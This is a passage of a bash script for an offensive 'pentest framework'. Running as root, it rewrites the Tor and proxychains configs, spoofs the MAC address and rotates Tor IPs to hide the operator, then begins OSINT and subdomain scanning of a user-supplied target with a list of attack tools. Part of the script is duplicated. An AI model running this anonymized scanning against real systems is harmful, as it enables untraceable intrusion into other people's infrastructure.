#!/bin/bash
# ================================================================
#   CASSIOPEIA PENTEST FRAMEWORK v4.0.0
#   All-in-One: OPSEC -> Pentest -> Addon -> Report
#   Platform: Arch Linux (REQUIRED)
#   Developer: Xyra77
#   AUTHORIZED PENETRATION TESTING ONLY
#   Usage: sudo bash cassiopeia.sh [existing_output_dir]
# ================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

clear

# ── OS DETECTION & ARCH CHECK ────────────────────────────────────
detect_os() {
    OS_NAME=""
    OS_DISTRO=""
    OS_ARCH_BASED=false

    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS_NAME="$NAME"
        OS_DISTRO="$ID"
        # Check if Arch-based
        case "$ID" in
            arch|garuda|manjaro|endeavouros|artix|blackarch|cachyos|archcraft|arcolinux)
                OS_ARCH_BASED=true ;;
            *)
                # Check ID_LIKE
                echo "${ID_LIKE:-}" | grep -qi "arch" && OS_ARCH_BASED=true ;;
        esac
    elif command -v pacman &>/dev/null; then
        OS_ARCH_BASED=true
        OS_NAME="Arch-based (detected via pacman)"
    fi
}

detect_os

echo -e "\033[0;31m\033[1m"
cat << 'ALERTBANNER'
+==================================================================+
|          CASSIOPEIA PENTEST FRAMEWORK v4.0.0 by Xyra77           |
+==================================================================+
|                                                                  |
|   !!  IMPORTANT NOTICE -- READ BEFORE CONTINUING  !!             |
|                                                                  |
|   [1] AUTHORIZED USE ONLY                                        |
|       This tool is for AUTHORIZED penetration testing ONLY.      |
|       Unauthorized use against systems you don't own or have     |
|       explicit written permission to test is ILLEGAL.            |
|       The developer assumes NO responsibility for misuse.        |
|                                                                  |
|   [2] PLATFORM REQUIREMENT                                       |
|       Cassiopeia is designed for Arch Linux / Garuda Linux.      |
|       Other distros are NOT supported and may cause errors.      |
|                                                                  |
|   [3] ROOT REQUIRED                                              |
|       Must be run as root for full functionality.                |
|                                                                  |
|   [4] NETWORK IMPACT                                             |
|       This tool generates significant network traffic.           |
|       Ensure you have proper authorization before proceeding.    |
|                                                                  |
+==================================================================+
ALERTBANNER
echo -e "\033[0m"

echo -e "\033[0;36m[*] Detected OS: ${OS_NAME:-Unknown} (${OS_DISTRO:-unknown})\033[0m"

if [[ "$OS_ARCH_BASED" == "false" ]]; then
    echo -e "\033[0;31m"
    echo "+------------------------------------------------------------------+"
    echo "|  [X] INCOMPATIBLE OPERATING SYSTEM DETECTED                     |"
    echo "+------------------------------------------------------------------+"
    echo "|  Cassiopeia requires Arch Linux or an Arch-based distro.        |"
    echo "|                                                                  |"
    echo "|  Supported:  Arch, Garuda, Manjaro, EndeavourOS, Artix,         |"
    echo "|              BlackArch, CachyOS, ArchCraft, ArcoLinux           |"
    echo "|                                                                  |"
    echo "|  Detected:   ${OS_NAME:-Unknown}"
    echo "|                                                                  |"
    echo "|  Reason: Tool relies on pacman, BlackArch repo, and             |"
    echo "|          Arch-specific package paths.                           |"
    echo "+------------------------------------------------------------------+"
    echo -e "\033[0m"
    echo -e "\033[1;33m[?] Continue anyway? Results may be unpredictable. (y/N): \033[0m"
    read -rp "    > " FORCE_CONTINUE
    if [[ "$FORCE_CONTINUE" != "y" && "$FORCE_CONTINUE" != "Y" ]]; then
        echo -e "\033[0;31m[X] Aborted. Install Arch/Garuda Linux and try again.\033[0m"
        exit 1
    fi
    echo -e "\033[1;33m[!] Continuing on unsupported OS -- proceed with caution\033[0m\n"
else
    echo -e "\033[0;32m[OK] Compatible OS: ${OS_NAME} -- Arch-based confirmed\033[0m"
fi

echo ""
echo -e "\033[1;33m[!] By continuing, you confirm that:\033[0m"
echo -e "    1. You have WRITTEN AUTHORIZATION to test the target"
echo -e "    2. You understand this tool generates aggressive network traffic"
echo -e "    3. You accept full responsibility for how this tool is used"
echo ""
echo -e "\033[0;36m[?] Do you accept and wish to continue? (yes/no): \033[0m"
read -rp "    > " DISCLAIMER_ACCEPT
if [[ "$DISCLAIMER_ACCEPT" != "yes" ]]; then
    echo -e "\033[0;31m[X] Aborted.\033[0m"
    exit 1
fi
echo -e "\033[0;32m[OK] Disclaimer accepted. Starting Cassiopeia...\033[0m\n"
sleep 1
clear

echo -e "\033[0;31m\033[1m"
cat << 'BANNER'

 ██████╗ █████╗ ███████╗███████╗██╗ ██████╗ ██████╗ ███████╗██╗ █████╗
██╔════╝██╔══██╗██╔════╝██╔════╝██║██╔═══██╗██╔══██╗██╔════╝██║██╔══██╗
██║     ███████║███████╗███████╗██║██║   ██║██████╔╝█████╗  ██║███████║
██║     ██╔══██║╚════██║╚════██║██║██║   ██║██╔═══╝ ██╔══╝  ██║██╔══██║
╚██████╗██║  ██║███████║███████║██║╚██████╔╝██║     ███████╗██║██║  ██║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝

        ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
        ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
        ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║
        ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║
        ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║
        ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝

BANNER
echo -e "${NC}"
echo -e "${CYAN}              v4.0.0  |  by Xyra77${NC}"
echo -e "${YELLOW}${BOLD}   [ ALL-IN-ONE: OPSEC -> PENTEST -> ADDON -> PDF ]${NC}"
echo -e "${CYAN}   [ BlackArch Linux | 40+ Tools | Zero-Day Mode ]${NC}"
echo -e "${RED}   [ !! AUTHORIZED PENETRATION TESTING ONLY !! ]${NC}\n"

if [[ "$EUID" -ne 0 ]]; then
    echo -e "${RED}[X] Must be run as root!${NC}"
    echo -e "${YELLOW}[>] sudo bash cassiopeia.sh${NC}"
    exit 1
fi

RESUME_MODE="false"
LAST_PHASE=""
SKIP_TO_PHASE=0

if [[ -n "$1" && -d "$1" ]]; then
    OUTPUT_DIR="$1"
    LOG="${OUTPUT_DIR}/master_log.txt"

    # Baca target URL dari log lama
    TARGET_URL=$(grep "\[+\] Target" "$LOG" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | xargs)
    [[ -z "$TARGET_URL" ]] &&         TARGET_URL=$(grep "Target" "$LOG" 2>/dev/null | head -1 | awk -F': ' '{print $2}' | xargs)

    if [[ -z "$TARGET_URL" ]]; then
        echo -e "${CYAN}[*] Masukkan target URL:${NC}"
        read -rp "TARGET URL > " TARGET_URL
    fi

    RESUME_MODE="true"

    # ── BACA PHASE TERAKHIR DARI MASTER LOG ──────────────────
    # Cari separator >> terakhir yang ada di log
    LAST_PHASE=$(grep ">> " "$LOG" 2>/dev/null | tail -1 | sed 's/.*>> //')

    # Tentukan nomor phase terakhir
    if echo "$LAST_PHASE" | grep -q "PHASE 1 \|OSINT"; then
        SKIP_TO_PHASE=1
    elif echo "$LAST_PHASE" | grep -q "PHASE 2 \|SUBDOMAIN"; then
        SKIP_TO_PHASE=2
    elif echo "$LAST_PHASE" | grep -q "PHASE 3 \|PORT"; then
        SKIP_TO_PHASE=3
    elif echo "$LAST_PHASE" | grep -q "PHASE 4 \|FINGERPRINT"; then
        SKIP_TO_PHASE=4
    elif echo "$LAST_PHASE" | grep -q "PHASE 5 \|PARAMETER"; then
        SKIP_TO_PHASE=5
    elif echo "$LAST_PHASE" | grep -q "PHASE 6 \|DIRECTORY"; then
        SKIP_TO_PHASE=6
    elif echo "$LAST_PHASE" | grep -q "PHASE 7 \|XSS"; then
        SKIP_TO_PHASE=7
    elif echo "$LAST_PHASE" | grep -q "PHASE 8 \|SQL"; then
        SKIP_TO_PHASE=8
    elif echo "$LAST_PHASE" | grep -q "PHASE 9 \|SSRF"; then
        SKIP_TO_PHASE=9
    elif echo "$LAST_PHASE" | grep -q "PHASE 10\|LFI"; then
        SKIP_TO_PHASE=10
    elif echo "$LAST_PHASE" | grep -q "PHASE 11\|SSTI"; then
        SKIP_TO_PHASE=11
    elif echo "$LAST_PHASE" | grep -q "PHASE 12\|CORS"; then
        SKIP_TO_PHASE=12
    elif echo "$LAST_PHASE" | grep -q "PHASE 13\|GRAPHQL"; then
        SKIP_TO_PHASE=13
    elif echo "$LAST_PHASE" | grep -q "PHASE 14\|NUCLEI"; then
        SKIP_TO_PHASE=14
    elif echo "$LAST_PHASE" | grep -q "PHASE 15\|METASPLOIT"; then
        SKIP_TO_PHASE=15
    elif echo "$LAST_PHASE" | grep -q "ADDON A\|PROTOTYPE"; then
        SKIP_TO_PHASE=16
    elif echo "$LAST_PHASE" | grep -q "ADDON B\|CODE INJECTION"; then
        SKIP_TO_PHASE=17
    elif echo "$LAST_PHASE" | grep -q "ADDON C\|BROWSER XSS"; then
        SKIP_TO_PHASE=18
    elif echo "$LAST_PHASE" | grep -q "ADDON D\|JAVASCRIPT"; then
        SKIP_TO_PHASE=19
    elif echo "$LAST_PHASE" | grep -q "P1\|VERIFICATION\|FALSE POSITIVE"; then
        SKIP_TO_PHASE=20
    elif echo "$LAST_PHASE" | grep -q "P2\|COVERAGE\|SCREENSHOT"; then
        SKIP_TO_PHASE=21
    elif echo "$LAST_PHASE" | grep -q "OPSEC\|TOR"; then
        SKIP_TO_PHASE=0
    fi

    echo -e "\n${MAGENTA}${BOLD}"
    echo "  +----------------------------------------------------------+"
    echo "  |  [RESUME] Continuing from existing folder                |"
    echo "  +----------------------------------------------------------+"
    echo -e "${NC}"
    echo -e "${CYAN}  [+] Dir       : ${BOLD}${OUTPUT_DIR}${NC}"
    echo -e "${CYAN}  [+] Target    : ${BOLD}${TARGET_URL}${NC}"
    if [[ -n "$LAST_PHASE" ]]; then
        echo -e "${YELLOW}  [+] Last phase : ${BOLD}${LAST_PHASE}${NC}"
        echo -e "${GREEN}  [+] Resuming from   : Phase ${SKIP_TO_PHASE}${NC}"
    else
        echo -e "${YELLOW}  [i] Log empty -- starting from scratch${NC}"
    fi
    echo -e "${YELLOW}  [i] Previous results are preserved${NC}\n"
else
    echo -e "${CYAN}${BOLD}[*] Enter target URL (example: https://target.com):${NC}"
    read -rp "TARGET URL > " TARGET_URL
    [[ -z "$TARGET_URL" ]] && echo -e "${RED}[!] URL cannot be empty!${NC}" && exit 1
fi

TARGET_URL="${TARGET_URL%/}"
DOMAIN=$(echo "$TARGET_URL" | sed -E 's|https?://||' | sed 's|/.*||')
IP=$(dig +short "$DOMAIN" 2>/dev/null | head -1)
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
[[ "$RESUME_MODE" == "false" ]] && OUTPUT_DIR="pentest_${DOMAIN}_${TIMESTAMP}"
LOG="${OUTPUT_DIR}/master_log.txt"

mkdir -p "${OUTPUT_DIR}"/{opsec,recon,osint,params,xss,sqli,dirs,vulns,\
metasploit,headers,ports,ssrf,xxe,ssti,cors,smuggling,jwt,graphql,api,\
s3,lfi,rce,prototype_pollution,code_injection,browser_xss,js_analysis,report}

echo -e "\n${GREEN}[+] Target  : ${TARGET_URL}"
echo -e "[+] Domain  : ${DOMAIN}"
echo -e "[+] IP      : ${IP}"
echo -e "[+] Dir     : ${OUTPUT_DIR}"
echo -e "[+] Mode    : $([ "$RESUME_MODE" = "true" ] && echo "RESUME" || echo "NEW")"
echo -e "[+] Time    : $(date)${NC}\n"

# ── HELPERS ─────────────────────────────────────────────────────
log() { echo -e "$1" | tee -a "$LOG"; }

# ================================================================
#  TIME BUDGET SYSTEM -- Max 6 jam, makin mepet makin kenceng
# ================================================================
SCAN_START_TIME=$(date +%s)
MAX_SCAN_SECONDS=$((6 * 3600))   # 6 jam = 21600 detik
TURBO_LEVEL=0                     # 0=normal, 1=fast, 2=faster, 3=turbo, 4=MAX

# Hitung elapsed time dan update TURBO_LEVEL
update_turbo() {
    local NOW=$(date +%s)
    local ELAPSED=$((NOW - SCAN_START_TIME))
    local REMAINING=$((MAX_SCAN_SECONDS - ELAPSED))
    local PCT=$((ELAPSED * 100 / MAX_SCAN_SECONDS))

    local OLD_TURBO=$TURBO_LEVEL

    if   [[ $PCT -lt 40 ]]; then TURBO_LEVEL=0    # 0-40%   = Normal
    elif [[ $PCT -lt 60 ]]; then TURBO_LEVEL=1    # 40-60%  = Fast
    elif [[ $PCT -lt 75 ]]; then TURBO_LEVEL=2    # 60-75%  = Faster
    elif [[ $PCT -lt 88 ]]; then TURBO_LEVEL=3    # 75-88%  = Turbo
    else                         TURBO_LEVEL=4    # 88-100% = MAX BOOST
    fi

    local HH=$((REMAINING / 3600))
    local MM=$(( (REMAINING % 3600) / 60 ))
    local SS=$((REMAINING % 60))

    # Tampil perubahan turbo level
    if [[ $TURBO_LEVEL -ne $OLD_TURBO ]]; then
        local LABEL=""
        case $TURBO_LEVEL in
            0) LABEL="Normal" ;;
            1) LABEL="[FAST x1.5]" ;;
            2) LABEL="[FASTER x2]" ;;
            3) LABEL="[TURBO x3]" ;;
            4) LABEL="[MAX BOOST x5] !!" ;;
        esac
        echo -e "
${RED}${BOLD}  [TURBO] Mode changed -> ${LABEL} (remaining: ${HH}h${MM}m${SS}s)${NC}" | tee -a "$LOG"
    fi
}

# Get timeout value berdasarkan turbo level
# Usage: T=$(get_timeout 300)  → 300s di normal, makin kecil kalau turbo
get_timeout() {
    local BASE=$1
    case $TURBO_LEVEL in
        0) echo $BASE ;;
        1) echo $((BASE * 2 / 3)) ;;    # -33%
        2) echo $((BASE / 2)) ;;         # -50%
        3) echo $((BASE / 3)) ;;         # -66%
        4) echo $((BASE / 5)) ;;         # -80%
    esac
}

# Get thread count berdasarkan turbo level
# Usage: T=$(get_threads 50)  → 50 di normal, makin besar kalau turbo
get_threads() {
    local BASE=$1
    case $TURBO_LEVEL in
        0) echo $BASE ;;
        1) echo $((BASE * 3 / 2)) ;;    # +50%
        2) echo $((BASE * 2)) ;;         # +100%
        3) echo $((BASE * 3)) ;;         # +200%
        4) echo $((BASE * 5)) ;;         # +400%
    esac
}

# Get max items berdasarkan turbo level (buat limit URL, payloads, dll)
# Usage: MAX=$(get_max 100)  → 100 di normal, makin sedikit kalau turbo
get_max() {
    local BASE=$1
    case $TURBO_LEVEL in
        0) echo $BASE ;;
        1) echo $((BASE * 3 / 4)) ;;    # -25%
        2) echo $((BASE / 2)) ;;         # -50%
        3) echo $((BASE / 3)) ;;         # -66%
        4) echo $((BASE / 5)) ;;         # -80%
    esac
}

# Tampil status waktu sekarang
show_time_status() {
    local NOW=$(date +%s)
    local ELAPSED=$((NOW - SCAN_START_TIME))
    local REMAINING=$((MAX_SCAN_SECONDS - ELAPSED))
    local PCT=$((ELAPSED * 100 / MAX_SCAN_SECONDS))
    local HH=$((ELAPSED / 3600))
    local MM=$(( (ELAPSED % 3600) / 60 ))
    local RHH=$((REMAINING / 3600))
    local RMM=$(( (REMAINING % 3600) / 60 ))

    # Progress bar
    local BARS=$((PCT * 30 / 100))
    local BAR=$(printf '#%.0s' $(seq 1 $((BARS > 0 ? BARS : 1))))
    local SPACE=$(printf '.%.0s' $(seq 1 $((30 - BARS > 0 ? 30 - BARS : 1))))

    local COLOR="${GREEN}"
    [[ $PCT -ge 60 ]] && COLOR="${YELLOW}"
    [[ $PCT -ge 75 ]] && COLOR="${RED}"

    local TURBO_LABEL=""
    case $TURBO_LEVEL in
        1) TURBO_LABEL=" [FAST]" ;;
        2) TURBO_LABEL=" [FASTER]" ;;
        3) TURBO_LABEL=" [TURBO]" ;;
        4) TURBO_LABEL=" [MAX!!]" ;;
    esac

    echo -e "  ${COLOR}[${BAR}${SPACE}] ${PCT}% | Elapsed: ${HH}h${MM}m | Sisa: ${RHH}h${RMM}m${TURBO_LABEL}${NC}" | tee -a "$LOG"
}

# ── SMART RESUME: cek file output tiap tool ──────────────────────
# Kalau file output sudah ada dan tidak kosong → skip tool tsb
# Usage: tool_done "path/to/output.txt" || { jalankan tool; }
tool_done() {
    local outfile="$1"
    local min_size="${2:-10}"  # minimum 10 bytes dianggap valid
    if [[ -f "$outfile" && $(wc -c < "$outfile" 2>/dev/null) -gt $min_size ]]; then
        echo -e "  ${GREEN}[v] SKIP -- output already exists: ${outfile}${NC}" | tee -a "$LOG"
        return 0  # salready exists, skipping
    fi
    return 1  # belum ada, jalankan
}

# Checking folder output apakah ada isinya (untuk multi-file output)
dir_done() {
    local outdir="$1"
    local pattern="${2:-*.txt}"
    if [[ -d "$outdir" ]] && ls "${outdir}"/${pattern} 2>/dev/null | head -1 | grep -q .; then
        local count=$(ls "${outdir}"/${pattern} 2>/dev/null | wc -l)
        echo -e "  ${GREEN}[v] SKIP -- folder already has content: ${outdir} (${count} files)${NC}" | tee -a "$LOG"
        return 0
    fi
    return 1
}

# Phase skip checker (baca master_log + cek file)
CURRENT_PHASE=0
PHASE_SKIPPED=false

should_skip() {
    local phase_num=$1
    CURRENT_PHASE=$phase_num
    if [[ "$RESUME_MODE" == "true" && $phase_num -le $SKIP_TO_PHASE ]]; then
        PHASE_SKIPPED=true
        echo -e "  ${YELLOW}[>>] SKIP Phase ${phase_num} -- already done${NC}" | tee -a "$LOG"
        return 0
    fi
    PHASE_SKIPPED=false
    return 1
}

phase_active() { [[ "$PHASE_SKIPPED" == "false" ]]; }

notify() {
    local T="$1" M="$2"
    case "$T" in
        OK)    echo -e "\n${GREEN}${BOLD}  [OK] ${M}${NC}" | tee -a "$LOG" ;;
        INFO)  echo -e "\n${CYAN}  [i]  ${M}${NC}" | tee -a "$LOG" ;;
        WARN)  echo -e "\n${YELLOW}${BOLD}  [!]  ${M}${NC}" | tee -a "$LOG" ;;
        ERROR) echo -e "\n${RED}${BOLD}  [X]  ${M}${NC}" | tee -a "$LOG" ;;
        PHASE) echo -e "\n${MAGENTA}${BOLD}  [>>] ${M}${NC}" | tee -a "$LOG" ;;
    esac
}

separator() {
    log "\n${CYAN}${BOLD}+----------------------------------------------------------+"
    log "  >> $1"
    log "+----------------------------------------------------------+${NC}\n"
}

check_tool() {
    command -v "$1" &>/dev/null && \
        echo -e "  ${GREEN}[v] $1${NC}" && return 0 || \
        echo -e "  ${YELLOW}[x] $1 -- skip${NC}" && return 1
}

px() {
    [[ "$TOR_ACTIVE" == "true" ]] && proxychains4 -q "$@" 2>/dev/null || "$@" 2>/dev/null
}

rq() {
    local UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) Version/17.3.1 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/122.0.0.0 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) Mobile/15E148 Safari/604.1"
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/122.0.0.0 Mobile Safari/537.36"
    )
    local UA="${UAS[$RANDOM % ${#UAS[@]}]}"
    if [[ "$TOR_ACTIVE" == "true" ]]; then
        proxychains4 -q curl -sk -A "$UA" -H "DNT: 1" "$@"
    else
        curl -sk -A "$UA" -H "DNT: 1" "$@"
    fi
}

rotate_ip() {
    [[ "$TOR_ACTIVE" != "true" ]] && return
    echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051 2>/dev/null
    sleep 4
    NEW_IP=$(proxychains4 -q curl -s --max-time 5 ifconfig.me 2>/dev/null)
    notify INFO "IP Rotated -> ${NEW_IP}"
}

# ================================================================
#  BAGIAN 1 -- OPSEC SETUP
# ================================================================
separator "SECTION 1 -- OPSEC SETUP TOR + PROXYCHAINS"
notify PHASE "Setting up connection security..."

# Install dependencies
notify INFO "Checking dependencies..."
MISSING_PKGS=()
for pkg in tor proxychains-ng curl netcat macchanger; do
    if ! pacman -Qq "$pkg" &>/dev/null && ! command -v "$pkg" &>/dev/null; then
        MISSING_PKGS+=("$pkg")
        echo -e "  ${YELLOW}[!] $pkg -- install${NC}"
    else
        echo -e "  ${GREEN}[v] $pkg -- OK${NC}"
    fi
done
[[ ${#MISSING_PKGS[@]} -gt 0 ]] && \
    pacman -S --noconfirm --needed "${MISSING_PKGS[@]}" 2>/dev/null

REAL_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null)
notify INFO "Real IP: ${RED}${REAL_IP}${NC}"

# Config ProxyChains
notify INFO "Configuring ProxyChains..."
PC_CONF=""
for f in /etc/proxychains4.conf /etc/proxychains.conf; do
    [[ -f "$f" ]] && PC_CONF="$f" && break
done
[[ -z "$PC_CONF" ]] && PC_CONF="/etc/proxychains4.conf"
[[ -f "$PC_CONF" ]] && cp "$PC_CONF" "${PC_CONF}.bak_${TIMESTAMP}"

cat > "$PC_CONF" << 'PCCONF'
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
localnet 10.0.0.0/255.0.0.0
localnet 172.16.0.0/255.240.0.0
localnet 192.168.0.0/255.255.0.0
[ProxyList]
socks5  127.0.0.1  9050
PCCONF
notify OK "ProxyChains -- strict_chain via Tor:9050"

# Config Tor
notify INFO "Configuring Tor..."
TOR_CONF="/etc/tor/torrc"
[[ -f "$TOR_CONF" ]] && cp "$TOR_CONF" "${TOR_CONF}.bak_${TIMESTAMP}"

cat > "$TOR_CONF" << 'TORCONF'
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
DataDirectory /var/lib/tor
Log notice file /var/log/tor/notices.log
TORCONF

mkdir -p /var/log/tor /var/lib/tor /run/tor
chown -R tor:tor /var/log/tor /var/lib/tor /run/tor 2>/dev/null
chmod 700 /var/lib/tor
chmod 755 /var/log/tor
notify OK "Tor configured SocksPort:9050 ControlPort:9051"

# MAC Spoof
notify INFO "MAC Address Spoofing..."
IFACE=$(ip link | grep -E "^[0-9]+: (eth|enp|wlan|wlp)" | head -1 | awk '{print $2}' | tr -d ':')
if [[ -n "$IFACE" ]] && command -v macchanger &>/dev/null; then
    ip link set "$IFACE" down 2>/dev/null
    NEW_MAC=$(macchanger -r "$IFACE" 2>/dev/null | grep "New MAC" | awk '{print $3}')
    ip link set "$IFACE" up 2>/dev/null
    notify OK "MAC Spoofed on ${IFACE} -> ${NEW_MAC}"
fi

# Start Tor
notify INFO "Restarting Tor service..."
systemctl stop tor 2>/dev/null
pkill -f "^tor" 2>/dev/null
sleep 2

# Fix user tor expired
chage -E -1 tor 2>/dev/null
usermod -e "" tor 2>/dev/null
chown -R tor:tor /var/lib/tor 2>/dev/null
chmod 700 /var/lib/tor 2>/dev/null

# Coba systemd dulu
systemctl reset-failed tor 2>/dev/null
systemctl start tor 2>/dev/null
sleep 5

# Kalau gagal, bypass systemd
if ! ss -tlnp | grep -q 9050; then
    notify WARN "Systemd failed -- starting Tor directly..."
    pkill -f "^tor" 2>/dev/null
    su -s /bin/bash tor -c "tor -f /etc/tor/torrc > /tmp/tor_run.log 2>&1 &"
    sleep 5
fi

# Tunggu bootstrap
notify INFO "Waiting for Tor bootstrap... max 90 seconds"
TOR_ACTIVE="false"
TOR_IP=""
MAX_WAIT=18

for i in $(seq 1 $MAX_WAIT); do
    BARS=$((i * 40 / MAX_WAIT))
    BAR=$(printf '#%.0s' $(seq 1 $BARS))
    SPACE=$(printf '.%.0s' $(seq 1 $((40 - BARS))))
    PCTG=$((i * 100 / MAX_WAIT))
    printf "\r  ${CYAN}[%s%s] %d%% -- Checking %d/%d${NC}" "$BAR" "$SPACE" "$PCTG" "$i" "$MAX_WAIT"
    sleep 5

    # Checking 1: socks5-hostname
    TOR_JSON=$(curl -s --socks5-hostname 127.0.0.1:9050 --tlsv1.2 \
               --max-time 10 https://check.torproject.org/api/ip 2>/dev/null)
    # Checking 2: proxychains fallback
    [[ -z "$TOR_JSON" ]] && \
        TOR_JSON=$(proxychains4 -q curl -s --max-time 10 \
                   https://check.torproject.org/api/ip 2>/dev/null)
    # Checking 3: ipify fallback
    if [[ -z "$TOR_JSON" ]]; then
        TOR_IP_TEST=$(curl -s --socks5-hostname 127.0.0.1:9050 \
                      --max-time 10 https://api.ipify.org 2>/dev/null)
        if [[ -n "$TOR_IP_TEST" && "$TOR_IP_TEST" != "$REAL_IP" ]]; then
            TOR_JSON="{\"IsTor\":true,\"IP\":\"${TOR_IP_TEST}\"}"
        fi
    fi

    if echo "$TOR_JSON" | grep -q '"IsTor":true'; then
        TOR_IP=$(echo "$TOR_JSON" | grep -oE '"IP":"[^"]*"' | cut -d'"' -f4)
        TOR_ACTIVE="true"
        break
    fi
done
echo ""

if [[ "$TOR_ACTIVE" == "true" ]]; then
    echo -e "\n${GREEN}${BOLD}"
    echo "  +----------------------------------------------------------+"
    echo "  |  [OK] TOR + PROXYCHAINS ACTIVE -- OPSEC OK               |"
    echo "  +----------------------------------------------------------+"
    echo -e "${NC}"
    notify OK "Real IP     : ${RED}${REAL_IP}${NC}"
    notify OK "IP via Tor : ${CYAN}${TOR_IP}${NC}"
    notify OK "Hidden     : YES"

    DNS_RESP=$(proxychains4 -q curl -s --max-time 8 \
               "https://dnsleaktest.com/test" 2>/dev/null | \
               grep -oE '"ip":"[^"]*"' | head -3)
    if echo "$DNS_RESP" | grep -qv "$REAL_IP"; then
        notify OK "DNS Leak   : NONE"
    else
        notify WARN "DNS Leak   : POSSIBLE -- check manually"
    fi

    {
        echo "=== OPSEC STATUS ==="
        echo "IP Asli  : $REAL_IP"
        echo "IP Tor   : $TOR_IP"
        echo "MAC      : $NEW_MAC"
        echo "Waktu    : $(date)"
    } > "${OUTPUT_DIR}/opsec/status.txt"

else
    echo -e "\n${RED}${BOLD}"
    echo "  +----------------------------------------------------------+"
    echo "  |  [X] TOR FAILED TO CONNECT -- SCAN ABORTED!              |"
    echo "  +----------------------------------------------------------+"
    echo -e "${NC}"
    notify ERROR "Tor failed to connect within 90 seconds"
    notify ERROR "SCAN ABORTED for your security!"
    echo ""
    echo -e "  Solutions:"
    echo -e "  1. Checking koneksi internet"
    echo -e "  2. ISP blocking Tor -> use Bridge in /etc/tor/torrc"
    echo -e "  3. Bridges: https://bridges.torproject.org"
    echo -e "  4. sudo systemctl restart tor"
    exit 1
fi

notify OK "OPSEC SIAP -- Proceeding to pentest..."
sleep 2

# ================================================================
#  BAGIAN 2 -- PENTEST UTAMA
# ================================================================
separator "SECTION 2 -- MAIN PENTEST 40+ TOOLS"
notify PHASE "Starting Main Pentest..."

notify INFO "Checking available tools..."
TOOLS_LIST=(nmap masscan whatweb wafw00f wpscan nikto testssl.sh curl
    subfinder amass assetfinder httdnsx gau waybackurls hakrawler
    katana gospider paramspider arjun ffuf gobuster feroxbuster
    dalfox kxss sqlmap nuclei msfconsole corscanner smuggler tplmap
    commix crlfuzz theharvester shodan gitleaks s3scanner fierce
    dnsrecon gf)
for t in "${TOOLS_LIST[@]}"; do check_tool "$t"; done
sleep 1

# PHASE 1: OSINT

# ================================================================
#  BAGIAN 2 -- PENTEST UTAMA
# ================================================================
separator "SECTION 2 -- MAIN PENTEST 40+ TOOLS"
notify PHASE "Starting Main Pentest..."

notify INFO "Checking available tools..."
TOOLS_LIST=(nmap masscan whatweb wafw00f wpscan nikto testssl.sh curl
    subfinder amass assetfinder httpx dnsx gau waybackurls hakrawler
    katana gospider paramspider arjun ffuf gobuster feroxbuster
    dalfox kxss sqlmap nuclei msfconsole tplmap
    commix crlfuzz theharvester shodan gitleaks s3scanner fierce
    dnsrecon gf cariddi)
for t in "${TOOLS_LIST[@]}"; do check_tool "$t"; done
sleep 1

# ── PHASE 1: OSINT ──────────────────────────────────────────────
update_turbo; show_time_status
should_skip 1 || separator "PHASE 1 -- OSINT & PASSIVE RECON"
if ! $PHASE_SKIPPED; then
    if check_tool "theharvester"; then
        tool_done "${OUTPUT_DIR}/osint/theharvester.txt" || {
            notify INFO "theHarvester scanning..."
            timeout $(get_timeout 120) theharvester -d "$DOMAIN" -b google,bing,yahoo,crtsh -l 500 \
                > "${OUTPUT_DIR}/osint/theharvester.txt" 2>/dev/null
            notify OK "theHarvester -> osint/theharvester.txt"
        }
    fi
    if check_tool "shodan"; then
        tool_done "${OUTPUT_DIR}/osint/shodan.txt" || {
            notify INFO "Shodan lookup..."
            shodan host "$IP" > "${OUTPUT_DIR}/osint/shodan.txt" 2>/dev/null
            notify OK "Shodan -> osint/shodan.txt"
        }
    fi
    if check_tool "gitleaks"; then
        tool_done "${OUTPUT_DIR}/osint/gitleaks.json" || {
            gitleaks detect --source . \
                --report-path "${OUTPUT_DIR}/osint/gitleaks.json" 2>/dev/null
            notify OK "GitLeaks -> osint/gitleaks.json"
        }
    fi
    if check_tool "s3scanner"; then
        tool_done "${OUTPUT_DIR}/s3/s3scan.txt" || {
            for b in "$DOMAIN" "www.$DOMAIN" "dev.$DOMAIN" "api.$DOMAIN" "backup.$DOMAIN"; do
                echo "$b"
            done | s3scanner scan --bucket-file /dev/stdin \
                > "${OUTPUT_DIR}/s3/s3scan.txt" 2>/dev/null
            notify OK "S3Scanningner -> s3/s3scan.txt"
        }
    fi
fi

# ── PHASE 2: SUBDOMAIN ──────────────────────────────────────────
update_turbo; show_time_status
should_skip 2 || separator "PHASE 2 -- SUBDOMAIN ENUMERATION"
if ! $PHASE_SKIPPED; then
    notify INFO "Parallel subdomain -- Subfinder + Assetfinder..."
    {
        tool_done "${OUTPUT_DIR}/recon/subfinder.txt" || {
            command -v subfinder &>/dev/null && \
                subfinder -d "$DOMAIN" -silent -all \
                > "${OUTPUT_DIR}/recon/subfinder.txt" 2>/dev/null &
        }
